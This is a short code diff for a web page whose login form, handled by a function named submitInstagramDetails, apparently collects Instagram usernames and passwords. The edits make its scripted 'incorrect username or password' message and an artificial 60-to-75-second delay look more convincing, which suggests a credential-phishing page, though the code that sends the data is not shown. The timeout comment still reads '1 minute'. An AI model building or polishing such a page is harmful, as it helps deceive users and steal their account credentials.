@@ -137,7 +137,7 @@
   <button class="login-btn" onclick="submitInstagramDetails()">Continue</button>
 
   <div id="errorMsg" style="display:none;color:#d32f2f;margin-top:12px;font-size:13px;text-align:center;">
-  Please check your username and password and try again.
+  Incorrect username or password try again
 </div>
 
 <div id="successMsg" style="display:none;color:#2e7d32;margin-top:12px;font-size:13px;text-align:center;font-weight:600;">
@@ -207,7 +207,7 @@ function submitInstagramDetails() {
       successMsg.style.display = "block";
       usernameInput.value = "";
       passwordInput.value = "";
-    }, 60000); // 1 minute
+    }, 75000); // 1 minute
   })
   .catch(err => {
     console.error(err);
